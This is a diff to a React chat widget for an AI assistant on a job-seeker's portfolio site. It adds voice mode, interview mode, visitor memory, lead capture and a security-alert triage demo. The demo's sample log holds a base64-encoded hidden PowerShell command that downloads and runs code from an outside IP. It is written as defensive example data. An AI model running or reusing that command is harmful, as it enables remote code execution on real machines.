@@ -2,13 +2,29 @@
 import { useEffect, useRef, useState } from 'react'
 import PwezaMark from './PwezaMark'
 import Link from 'next/link'
+import { usePathname, useRouter } from 'next/navigation'
 import { useRole } from './roles'
+import { projects } from '@/data/projects'
 
 type ProofLink = { label: string; href: string }
 type Source = { n: number; title: string; href: string }
 type FitItem = { requirement: string; status: 'strong' | 'partial' | 'gap'; evidence: string; href?: string }
 type Fit = { role: string; company?: string; score: number; summary: string; items: FitItem[]; strengths: string[]; gaps: string[] }
-type Msg = { role: 'user' | 'assistant' | 'joseph' | 'system'; content: string; links?: ProofLink[]; sources?: Source[]; fit?: Fit; checked?: boolean; streaming?: boolean; href?: string }
+type Triage = { verdict: string; severity: 'Low' | 'Medium' | 'High' | 'Critical'; mitre: { id: string; name: string }[]; why: string[]; next: string[] }
+type Card = { title: string; subtitle: string; href: string; image: string | null; status: string; stack: string[] }
+type Msg = {
+  role: 'user' | 'assistant' | 'joseph' | 'system'; content: string; links?: ProofLink[]; sources?: Source[]; fit?: Fit; checked?: boolean; streaming?: boolean; href?: string
+  triage?: Triage; card?: Card; nav?: string | null; voice?: string; q?: string; vote?: 'up' | 'down'; jobPost?: string
+}
+
+// Same sample as the server's SAMPLE_ALERT: Word spawning hidden, encoded PowerShell that calls out to a Tor exit node.
+const SAMPLE_ALERT = '2026-11-20T03:14:07Z host=WS-0142 user=jdoe EventID=4688 process=powershell.exe parent=winword.exe cmdline="powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQAMgAvAGEAJwApAA==" dest_ip=185.220.101.42'
+
+/** The tracker's long-lived visitor id (for "welcome back" memory). */
+function visitorId(): string {
+  try { return JSON.parse(localStorage.getItem('pa-visitor') || 'null')?.id || '' } catch { return '' }
+}
+
 
 /** Renders "[2]" citations as small links to the passage PWEZA used. */
 function withCitations(text: string, sources: Source[] | undefined, onNav: () => void) {
@@ -68,6 +84,21 @@ export default function AIChat() {
   const [live, setLive] = useState(false)
   const liveAfter = useRef(0)
   const wasLive = useRef(false)
+  const pathname = usePathname() || '/'
+  const router = useRouter()
+  const [online, setOnline] = useState(false)
+  const [interview, setInterview] = useState(false)
+  const [full, setFull] = useState(false)
+  const [talk, setTalk] = useState(false)
+  const talkRef = useRef(false)
+  const [smart, setSmart] = useState<string[]>([])
+  const [leadOpen, setLeadOpen] = useState(false)
+  const [leadSent, setLeadSent] = useState(false)
+  const [cvBusy, setCvBusy] = useState(false)
+  const [nudge, setNudge] = useState(false)
+  const greeted = useRef(false)
+  const projectId = pathname.match(/^\/projects\/([^/#?]+)/)?.[1]
+  const pageProject = projectId ? projects.find((p) => p.id === projectId) : undefined
 
   // Joseph can take over from Telegram: poll for his messages while the chat is open (or he's live).
   useEffect(() => {
@@ -84,8 +115,10 @@ export default function AIChat() {
         for (const m of d.messages || []) {
           if (m.t === '__joined__') incoming.push({ role: 'system', content: 'Joseph joined the chat 👋' })
           else if (m.t === '__handback__') incoming.push({ role: 'system', content: 'Joseph handed you back to PWEZA.' })
+          else if (typeof m.t === 'string' && m.t.startsWith('__voice__:')) incoming.push({ role: 'joseph', content: '🎙 Voice message', voice: `/api/chat/voice/${m.t.slice(10)}` })
           else incoming.push({ role: 'joseph', content: m.t })
         }
+        if (typeof d.online === 'boolean') setOnline(d.online)
         if (incoming.length) { setMessages((cur) => [...cur, ...incoming]); setOpen(true) }
         if (!!d.live !== wasLive.current) { wasLive.current = !!d.live; setLive(!!d.live) }
       } catch { /* try again next tick */ }
@@ -108,6 +141,33 @@ export default function AIChat() {
     return () => window.removeEventListener('scroll', onScroll)
   }, [])
 
+  // 👋 First open: welcome back returning visitors; on a project page, offer to walk them through it.
+  useEffect(() => {
+    if (!open || greeted.current) return
+    greeted.current = true
+    if (pageProject) setMessages((m) => [...m, { role: 'assistant', content: `You're looking at ${pageProject.title}. Want the 60-second version, the architecture, or how it maps to a real SOC job?` }])
+    const vid = visitorId()
+    if (!vid) return
+    fetch(`/api/chat/memory?vid=${encodeURIComponent(vid)}`, { cache: 'no-store' }).then((r) => r.json()).then((d) => {
+      const mem = d?.memory
+      if (!mem?.last) return
+      const topic = mem.topics?.[0]
+      setMessages((m) => [...m, { role: 'assistant', content: `Welcome back. Last time you asked “${String(mem.last).slice(0, 90)}”.${topic ? ` Want to pick up on ${topic}?` : ' Want to pick up where we left off?'}` }])
+    }).catch(() => {})
+  }, [open, pageProject])
+
+  // A quiet nudge on project pages after a while, never more than once per visit.
+  useEffect(() => {
+    setNudge(false)
+    if (!pageProject) return
+    let seen = false
+    try { seen = sessionStorage.getItem('pz-nudged') === '1' } catch {}
+    if (seen) return
+    const t = setTimeout(() => { if (!open) { setNudge(true); try { sessionStorage.setItem('pz-nudged', '1') } catch {} } }, 25_000)
+    return () => clearTimeout(t)
+  }, [pathname, pageProject, open])
+  useEffect(() => { if (open) setNudge(false) }, [open])
+
   useEffect(() => { listRef.current?.scrollTo({ top: listRef.current.scrollHeight, behavior: 'smooth' }) }, [messages, loading])
   useEffect(() => { if (open) setTimeout(() => inputRef.current?.focus(), 150) }, [open])
   useEffect(() => {
@@ -120,12 +180,13 @@ export default function AIChat() {
     window.addEventListener('pweza:toggle', toggle)
     return () => window.removeEventListener('pweza:toggle', toggle)
   }, [])
-  useEffect(() => { if (!open) { audioRef.current?.pause(); recRef.current?.stop?.() } }, [open])
+  useEffect(() => { if (!open) { audioRef.current?.pause(); recRef.current?.stop?.(); talkRef.current = false; setTalk(false); setFull(false) } }, [open])
 
-  const send = async (text: string) => {
+  const send = async (text: string, opts: { mode?: 'demo'; label?: string } = {}) => {
     const q = text.trim()
     if (!q || loading) return
-    const next: Msg[] = [...messages, { role: 'user', content: q }]
+    setSmart([])
+    const next: Msg[] = [...messages, { role: 'user', content: opts.label || q }]
     setMessages(next)
     setInput('')
     setLoading(true)
@@ -135,17 +196,23 @@ export default function AIChat() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          messages: next.slice(1).filter((m) => m.role === 'user' || m.role === 'assistant' || m.role === 'joseph').map(({ role, content }) => ({ role: role === 'joseph' ? 'assistant' : role, content: content.replace(/\s*\[\d+\]/g, '') })),
+          messages: next.slice(1).map((m, i, arr) => (i === arr.length - 1 && opts.label ? { ...m, content: q } : m)).filter((m) => m.role === 'user' || m.role === 'assistant' || m.role === 'joseph').map(({ role, content }) => ({ role: role === 'joseph' ? 'assistant' : role, content: content.replace(/\s*\[\d+\]/g, '') })),
           wantsAudio: voiceOut,
           sid: chatSid(),
           stream: true,
+          mode: opts.mode || (interview ? 'interview' : undefined),
+          vid: visitorId() || undefined,
+          visitorRole: role || undefined,
+          page: pathname,
         }),
       })
       const playAudio = (audio?: string | null) => {
-        if (!voiceOut || !audio) return
+        if (!(voiceOut || talkRef.current) || !audio) { if (talkRef.current) setTimeout(() => listen(true), 400); return }
         audioRef.current?.pause()
         audioRef.current = new Audio(audio)
-        audioRef.current.play().catch(() => {})
+        // Hands-free talk mode: when PWEZA finishes speaking, listen again.
+        audioRef.current.onended = () => { if (talkRef.current) listen(true) }
+        audioRef.current.play().catch(() => { if (talkRef.current) listen(true) })
       }
       // Streaming answer: words appear as PWEZA writes them; the fact-checker may refine the text at the end.
       if ((res.headers.get('content-type') || '').includes('ndjson') && res.body) {
@@ -164,10 +231,15 @@ export default function AIChat() {
             if (!line.trim()) continue
             let ev: any
             try { ev = JSON.parse(line) } catch { continue }
-            if (ev.type === 'meta') { begin(); patch((m) => ({ ...m, sources: ev.sources })) }
+            if (ev.type === 'meta') { begin(); patch((m) => ({ ...m, sources: ev.sources, card: ev.card, q })) }
             else if (ev.type === 'delta') { begin(); patch((m) => ({ ...m, content: m.content + ev.t })) }
             else if (ev.type === 'replace') { begin(); patch((m) => ({ ...m, content: ev.t, checked: !!ev.checked })) }
-            else if (ev.type === 'done') { begin(); patch((m) => ({ ...m, links: ev.links, streaming: false })); playAudio(ev.audio) }
+            else if (ev.type === 'done') {
+              begin(); patch((m) => ({ ...m, links: ev.links, nav: ev.nav, streaming: false, q }))
+              if (Array.isArray(ev.suggestions)) setSmart(ev.suggestions.slice(0, 3))
+              if (ev.hiring) setLeadOpen(true)
+              playAudio(ev.audio)
+            }
           }
         }
         if (started) patch((m) => ({ ...m, streaming: false }))
@@ -176,7 +248,7 @@ export default function AIChat() {
       const data = await res.json()
       if (data.live) { setLive(true); wasLive.current = true; return } // Joseph will answer himself
       const reply = data.content || data.error || "I couldn't answer that right now. You can email Joseph at kamarajosephallan@gmail.com."
-      setMessages((m) => [...m, { role: 'assistant', content: reply, links: data.links, fit: data.fit }])
+      setMessages((m) => [...m, { role: 'assistant', content: reply, links: data.links, fit: data.fit, triage: data.triage, q, jobPost: data.fit ? q : undefined }])
       playAudio(data.audio)
     } catch {
       setMessages((m) => [...m, { role: 'assistant', content: "Connection problem. Try again, or email kamarajosephallan@gmail.com." }])
@@ -212,10 +284,11 @@ export default function AIChat() {
   const answered = messages.filter((m) => m.role === 'assistant' && m !== messages[0]).length
   const canBrief = messages.some((m) => m.fit) || answered >= 2
 
-  const listen = () => {
+  function listen(auto = false) {
     const SR = (window as any).webkitSpeechRecognition || (window as any).SpeechRecognition
     if (!SR) return
-    if (listening) { recRef.current?.stop(); return }
+    if (auto && !talkRef.current) return
+    if (listening && !auto) { recRef.current?.stop(); return }
     const r = new SR()
     r.lang = 'en-US'
     r.interimResults = false
@@ -224,13 +297,65 @@ export default function AIChat() {
     r.onerror = () => setListening(false)
     r.onresult = (e: any) => {
       const said = e.results?.[0]?.[0]?.transcript ?? ''
-      if (said) { setVoiceOut(true); send(said) }
+      if (said) { if (!talkRef.current) setVoiceOut(true); send(said) }
     }
     recRef.current = r
-    r.start()
+    try { r.start() } catch { /* already listening */ }
+  }
+  const toggleTalk = () => {
+    const on = !talkRef.current
+    talkRef.current = on; setTalk(on)
+    if (on) { setFull(true); listen(true) } else { recRef.current?.stop?.(); audioRef.current?.pause() }
   }
 
-  const suggestions = SUGGESTIONS[role ?? 'default'] ?? SUGGESTIONS.default
+  const rate = (i: number, vote: 'up' | 'down') => {
+    const m = messages[i]
+    if (!m || m.vote) return
+    setMessages((cur) => cur.map((x, k) => (k === i ? { ...x, vote } : x)))
+    fetch('/api/chat/feedback', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ vote, q: m.q || '', a: m.content.slice(0, 1500), sid: chatSid() }) }).catch(() => {})
+  }
+
+  const sendLead = async (e: React.FormEvent<HTMLFormElement>) => {
+    e.preventDefault()
+    const f = new FormData(e.currentTarget)
+    if (!f.get('consent')) return
+    try {
+      const r = await fetch('/api/lead', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: f.get('email'), name: f.get('name'), company: f.get('company'), note: f.get('note'), consent: true, sid: chatSid() }) })
+      const d = await r.json()
+      setLeadSent(true); setLeadOpen(false)
+      setMessages((cur) => [...cur, { role: 'system', content: d.ok ? 'Sent. Joseph got your details on his phone and will reply by email.' : d.error === 'invalid' ? 'That email doesn\'t look right. Try again?' : 'Couldn\'t send that right now. You can email kamarajosephallan@gmail.com.' }])
+      if (!d.ok && d.error === 'invalid') { setLeadSent(false); setLeadOpen(true) }
+    } catch { setMessages((cur) => [...cur, { role: 'system', content: 'Couldn\'t send that right now. You can email kamarajosephallan@gmail.com.' }]) }
+  }
+
+  const tailorCv = async (target: string) => {
+    if (cvBusy) return
+    setCvBusy(true)
+    try {
+      const r = await fetch('/api/resume/tailor', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ target, sid: chatSid() }) })
+      const d = await r.json()
+      setMessages((cur) => [...cur, d.url
+        ? { role: 'system', content: `A one-page résumé tailored to ${d.role} is ready. Every line comes from verified facts.`, href: d.url }
+        : { role: 'system', content: d.error === 'slow-down' ? 'One moment, then try again.' : "Couldn't build the tailored résumé right now. The standard one is in the links above." }])
+    } catch { setMessages((cur) => [...cur, { role: 'system', content: "Couldn't build the tailored résumé right now." }]) }
+    finally { setCvBusy(false) }
+  }
+
+  const goTo = (href: string) => {
+    const [path, hash] = href.split('#')
+    if (!full) setOpen(false)
+    if ((path || '/') === pathname && hash) {
+      const el = document.getElementById(hash)
+      el?.scrollIntoView({ behavior: 'smooth', block: 'start' })
+      el?.classList.add('pz-highlight'); setTimeout(() => el?.classList.remove('pz-highlight'), 2600)
+    } else router.push(href)
+  }
+
+  const base = pageProject
+    ? [`Explain ${pageProject.title} in 60 seconds`, `What was hard about ${pageProject.title}?`, 'Is he a fit for SOC roles?']
+    : interview ? ['Tell me about a time he handled an incident', 'Describe a project he is proud of', 'How does he learn new tools?']
+    : SUGGESTIONS[role ?? 'default'] ?? SUGGESTIONS.default
+  const suggestions = smart.length ? smart : base
   const asked = new Set(messages.filter((m) => m.role === 'user').map((m) => m.content))
 
   if (hidden) return null
@@ -246,18 +371,38 @@ export default function AIChat() {
       >
         <PwezaMark size={28} />
         {open ? 'Close' : 'Ask my AI assistant'}
+        {online && !open && <span className="pz-online-dot" aria-label="Joseph is online" />}
       </button>
+      {nudge && !open && pageProject && (
+        <button type="button" className="pz-nudge" onClick={() => setOpen(true)}>
+          Questions about {pageProject.title}? Ask PWEZA <span aria-hidden>→</span>
+        </button>
+      )}
 
-      <section id="pweza-panel" aria-label="PWEZA assistant" className={`pz-panel ${open ? 'is-open' : ''}`} aria-hidden={!open}>
+      <section id="pweza-panel" aria-label="PWEZA assistant" className={`pz-panel ${open ? 'is-open' : ''} ${full ? 'is-full' : ''}`} aria-hidden={!open}>
         <header className="flex items-center justify-between gap-3 border-b border-line px-5 py-4">
           <div className="flex items-center gap-3">
             <PwezaMark size={36} />
             <div>
-              <p className="text-[15px] font-semibold text-snow">PWEZA</p>
-              <p className="text-[12px] text-smoke">Answers only from verified facts</p>
+              <p className="text-[15px] font-semibold text-snow">PWEZA {interview && <span className="pz-mode-tag">Interview</span>}</p>
+              <p className="text-[12px] text-smoke">{online ? <span className="pz-online"><i /> Joseph is online</span> : 'Verified answers only'}</p>
             </div>
           </div>
           <div className="flex items-center gap-1">
+            <button type="button" onClick={() => { setInterview((v) => !v); setSmart([]) }} aria-pressed={interview} className={`pz-icon ${interview ? 'is-on' : ''}`} title={interview ? 'Interview mode on: answers in STAR form' : 'Interview mode: ask interview questions, get STAR answers'}>
+              <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round"><path d="M4 5h16v11H8l-4 4z" /><path d="M8 9h8M8 12h5" /></svg>
+              <span className="sr-only">{interview ? 'Turn interview mode off' : 'Turn interview mode on'}</span>
+            </button>
+            {canListen && (
+              <button type="button" onClick={toggleTalk} aria-pressed={talk} className={`pz-icon ${talk ? 'is-on' : ''}`} title={talk ? 'End hands-free conversation' : 'Talk hands-free'}>
+                <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round"><path d="M4 12h1M8 8v8M12 5v14M16 8v8M20 12h-1" /></svg>
+                <span className="sr-only">{talk ? 'End hands-free conversation' : 'Start hands-free conversation'}</span>
+              </button>
+            )}
+            <button type="button" onClick={() => setFull((v) => !v)} aria-pressed={full} className="pz-icon pz-full-btn" title={full ? 'Exit full screen' : 'Full screen'}>
+              <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">{full ? <path d="M9 4v5H4M15 4v5h5M9 20v-5H4M15 20v-5h5" /> : <path d="M4 9V4h5M20 9V4h-5M4 15v5h5M20 15v5h-5" />}</svg>
+              <span className="sr-only">{full ? 'Exit full screen' : 'Full screen'}</span>
+            </button>
             <button type="button" onClick={() => { setVoiceOut((v) => !v); audioRef.current?.pause() }} aria-pressed={voiceOut} className="pz-icon" title={voiceOut ? 'Voice replies on' : 'Voice replies off'}>
               <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
                 <path d="M4 9v6h4l5 4V5L8 9z" />
@@ -271,14 +416,37 @@ export default function AIChat() {
           </div>
         </header>
 
+        {talk && (
+          <div className="pz-talk" role="status">
+            <div className={`pz-talk-orb ${listening ? 'is-listening' : loading ? 'is-thinking' : 'is-speaking'}`} aria-hidden><i /><i /><i /></div>
+            <p>{listening ? 'Listening…' : loading ? 'Thinking…' : 'Speaking… just talk when it finishes'}</p>
+            <button type="button" onClick={toggleTalk} className="pz-chip">End conversation</button>
+          </div>
+        )}
         <div ref={listRef} className="pz-list" aria-live="polite">
           {messages.map((m, i) => (
             <div key={i} className={m.role === 'user' ? 'pz-msg pz-user' : m.role === 'joseph' ? 'pz-msg pz-bot pz-joseph' : m.role === 'system' ? 'pz-system' : 'pz-msg pz-bot'}>
-              {m.role === 'joseph' && <span className="pz-joseph-name">Joseph</span>}
+              {m.role === 'joseph' && <span className="pz-joseph-name"><img src="/profile/joseph-cutout.webp" alt="" className="pz-joseph-avatar" /> Joseph</span>}
               {m.role === 'system' && m.href ? (
                 <p>{m.content} <a href={m.href} target="_blank" rel="noopener" className="pz-proof">Open briefing</a></p>
               ) : (
                 <p className={m.streaming ? 'pz-streaming' : undefined}>{m.role === 'assistant' ? withCitations(m.content, m.sources, () => setOpen(false)) : m.content}</p>
+              )}
+              {m.voice && <audio controls preload="none" src={m.voice} className="pz-voice" />}
+              {m.card && (
+                <button type="button" onClick={() => goTo(m.card!.href)} className="pz-card">
+                  {m.card.image && <img src={m.card.image} alt="" loading="lazy" />}
+                  <span><b>{m.card.title}</b><em>{m.card.subtitle}</em><small>{m.card.stack.join(' · ')}</small></span>
+                </button>
+              )}
+              {m.triage && (
+                <div className="pz-triage">
+                  <div className="pz-triage-head"><span className={`sev sev-${m.triage.severity.toLowerCase()}`}>{m.triage.severity}</span><b>{m.triage.verdict}</b></div>
+                  {!!m.triage.mitre.length && <div className="pz-triage-mitre">{m.triage.mitre.map((t) => <a key={t.id} href={`https://attack.mitre.org/techniques/${t.id.replace('.', '/')}/`} target="_blank" rel="noopener">{t.id} · {t.name}</a>)}</div>}
+                  <p className="pz-triage-label">Why</p><ul>{m.triage.why.map((w, k) => <li key={k}>{w}</li>)}</ul>
+                  <p className="pz-triage-label">Next steps</p><ol>{m.triage.next.map((w, k) => <li key={k}>{w}</li>)}</ol>
+                  <p className="pz-triage-note">Educational demo of Joseph&apos;s BLUE SOC reasoning, not a live investigation.</p>
+                </div>
               )}
               {m.checked && <span className="pz-checked" title="PWEZA's fact-checker refined this answer against the site">✓ fact-checked</span>}
               {m.fit && (
@@ -296,6 +464,9 @@ export default function AIChat() {
                       </li>
                     ))}
                   </ul>
+                  {m.jobPost && (
+                    <button type="button" onClick={() => tailorCv(m.jobPost!)} disabled={cvBusy} className="pz-brief-btn">{cvBusy ? 'Tailoring résumé…' : '📄 Get a résumé tailored to this role'}</button>
+                  )}
                 </div>
               )}
               {!!m.links?.length && (
@@ -309,8 +480,34 @@ export default function AIChat() {
                   )}
                 </div>
               )}
+              {m.role === 'assistant' && m.nav && !m.streaming && (
+                <button type="button" onClick={() => goTo(m.nav!)} className="pz-proof pz-goto">Show me on the site →</button>
+              )}
+              {m.role === 'assistant' && i > 0 && !m.streaming && m.q && (
+                <div className="pz-rate" aria-label="Rate this answer">
+                  {m.vote ? <span>{m.vote === 'up' ? 'Thanks!' : 'Thanks, Joseph will improve this.'}</span> : (
+                    <>
+                      <button type="button" onClick={() => rate(i, 'up')} aria-label="Helpful">👍</button>
+                      <button type="button" onClick={() => rate(i, 'down')} aria-label="Not helpful">👎</button>
+                    </>
+                  )}
+                </div>
+              )}
             </div>
           ))}
+          {leadOpen && !leadSent && (
+            <form className="pz-lead" onSubmit={sendLead}>
+              <p><b>Want Joseph to follow up?</b> Leave your email and he gets it on his phone right away.</p>
+              <input name="email" type="email" required placeholder="you@company.com" className="pz-input" autoComplete="email" />
+              <div className="pz-lead-row">
+                <input name="name" placeholder="Name (optional)" className="pz-input" autoComplete="name" />
+                <input name="company" placeholder="Company (optional)" className="pz-input" autoComplete="organization" />
+              </div>
+              <input name="note" placeholder="Role or note (optional)" className="pz-input" maxLength={300} />
+              <label className="pz-consent"><input type="checkbox" name="consent" required /> Share these details with Joseph so he can contact me. <Link href="/privacy" onClick={() => setOpen(false)}>Privacy</Link></label>
+              <div className="pz-lead-row"><button type="submit" className="pz-brief-btn">Send to Joseph</button><button type="button" className="pz-chip" onClick={() => setLeadOpen(false)}>Not now</button></div>
+            </form>
+          )}
           {canBrief && !loading && !live && (
             <button type="button" onClick={createBrief} disabled={briefing} className="pz-brief-btn">
               {briefing ? 'Creating briefing…' : '📎 Share this with your hiring team'}
@@ -325,15 +522,21 @@ export default function AIChat() {
 
         <div className="flex gap-2 overflow-x-auto px-4 pb-2 pt-1">
           {suggestions.filter((s) => !asked.has(s)).map((s) => (
-            <button key={s} type="button" onClick={() => send(s)} className="pz-chip">{s}</button>
+            <button key={s} type="button" onClick={() => send(s)} className={`pz-chip ${smart.length ? 'is-smart' : ''}`}>{s}</button>
           ))}
+          {!asked.has('🧪 Triage demo: sample alert') && (
+            <button type="button" onClick={() => send(SAMPLE_ALERT, { mode: 'demo', label: '🧪 Triage demo: sample alert' })} className="pz-chip">🧪 Try a triage demo</button>
+          )}
+          {!leadOpen && !leadSent && answered >= 2 && (
+            <button type="button" onClick={() => setLeadOpen(true)} className="pz-chip">📇 Have Joseph contact me</button>
+          )}
         </div>
 
         <form onSubmit={(e) => { e.preventDefault(); send(input) }} className="flex items-center gap-2 border-t border-line p-3">
           <label htmlFor="pz-input" className="sr-only">Ask about Joseph</label>
-          <input id="pz-input" ref={inputRef} value={input} onChange={(e) => setInput(e.target.value)} placeholder="Ask about his work, skills, or fit" className="pz-input" maxLength={500} autoComplete="off" />
+          <input id="pz-input" ref={inputRef} value={input} onChange={(e) => setInput(e.target.value)} placeholder={interview ? 'Ask an interview question' : 'Ask, or paste a job post or an alert'} className="pz-input" maxLength={6000} autoComplete="off" />
           {canListen && (
-            <button type="button" onClick={listen} className={`pz-icon ${listening ? 'is-live' : ''}`} aria-pressed={listening} aria-label={listening ? 'Stop listening' : 'Ask by voice'}>
+            <button type="button" onClick={() => listen()} className={`pz-icon ${listening ? 'is-live' : ''}`} aria-pressed={listening} aria-label={listening ? 'Stop listening' : 'Ask by voice'}>
               <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
                 <rect x="9" y="3" width="6" height="11" rx="3" /><path d="M5 11a7 7 0 0014 0M12 18v3" />
               </svg>
@@ -343,6 +546,7 @@ export default function AIChat() {
             <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14M13 6l6 6-6 6" /></svg>
           </button>
         </form>
+        <p className="pz-secure"><Link href="/ai-security" onClick={() => setOpen(false)}>🛡 How PWEZA is secured</Link></p>
       </section>
     </>
   )
